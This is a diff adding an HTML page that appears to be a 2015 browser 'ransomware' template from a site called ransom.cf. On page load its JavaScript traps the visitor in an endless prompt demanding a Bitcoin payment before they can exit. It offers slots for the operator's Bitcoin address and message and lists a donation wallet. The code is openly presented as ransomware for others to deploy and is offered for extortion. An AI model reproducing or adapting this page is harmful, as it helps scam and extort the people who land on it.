@@ -1,0 +1,58 @@
+<!-- 
+=====================================================================================
+COPYRIGHT (c) 2015 RANSOM.CF
+
+YOU MAY EDIT ANY OF THE HTML BUT YOU SHOULDN'T EDIT THE JAVASCRIPT UNLESS IT SAYS SO.
+=====================================================================================
+-->
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>YourBTCAddressHere</title>
+		<script>
+		// the old code was exit56483293756291093724632532543513100325934138590324873259834923435434543
+		/*
+		===============================
+		YOU MAY CHANGE STUFF BELOW THIS
+		===============================
+		*/
+		
+		
+		var code = "^^vv<><>ba"; // This is the code that the user must ender to exit the ransomware
+		var redirect = "google.com"; // This is the site that it redirects to if you do manage to exit the ransomware (DO NOT PUT "http://www." IN FRONT OF YOUR LINK)
+		var message = "yourmessagehere"; // This is the message that the popup windows says
+		var address = "YourBtcAddressHere"; // This is your btc address
+		
+		
+		/*
+		==============================
+		DO NOT CHANGE STUFF BELOW THIS
+		==============================
+		*/
+		window.onload = popup;
+		function popup() {
+			var popupt = true;
+			while (popupt) {
+				var pop = prompt("You must deposit \u02430.01 to the following address with your email as the memo/description.  Within 24 hours you will be emailed the code that you must input in the box below to exit the page.", address);
+				if (pop === code) {
+					popupt = false;
+					window.location.replace("http://www." + redirect);
+				} else {
+					console.log("they answered incorrectly");
+				}
+			}
+			document.getElementById("sound").src = sound;
+		}
+		
+		</script>
+	</head>
+	<body>
+		<audio autoplay loop>
+			<source src="https://www.dialupsound.com/audio/dialup.mp3">
+		</audio>
+		<div>
+		Go to ransom.cf for ransomware examples like this or donate to us:<br>
+		135wcmhLbieVhyJZxxda7p25ej67brUYX7
+		</div>
+	</body>
+</html>
